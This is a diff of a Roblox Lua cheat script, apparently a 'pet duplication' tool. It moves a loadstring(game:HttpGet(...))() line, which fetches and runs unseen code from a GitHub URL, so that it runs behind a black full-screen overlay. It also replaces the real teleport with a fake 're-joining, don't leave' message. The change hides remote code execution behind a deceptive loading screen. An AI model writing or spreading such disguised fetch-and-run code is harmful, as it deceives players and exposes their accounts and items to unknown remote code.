@@ -92,9 +92,6 @@ button.MouseButton1Click:Connect(function()
 	button.Text = "✅ Activating..."
 	button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
 
-	-- Load PetsDuped script
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/RayField-Scripts/Tests/refs/heads/main/TESTS%202"))()
-
 	-- Black Loading Overlay
 	task.delay(0.01, function()
 		local gui = Instance.new("ScreenGui", CoreGui)
@@ -165,11 +162,12 @@ button.MouseButton1Click:Connect(function()
 				totalTime = totalTime - 1
 			end
 
-			msg.Text = "AUTO RE-JOIN START"
+			msg.Text = "✅ START RE-JOINING DON'T LEAVE..."
 			countdown.Text = ""
-			task.wait(2)
 
-			TeleportService:Teleport(game.PlaceId)
+			-- Load the main script here
+			task.wait(2)
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/RayField-Scripts/Tests/refs/heads/main/TESTS%202"))()
 		end)
 	end)
 end)
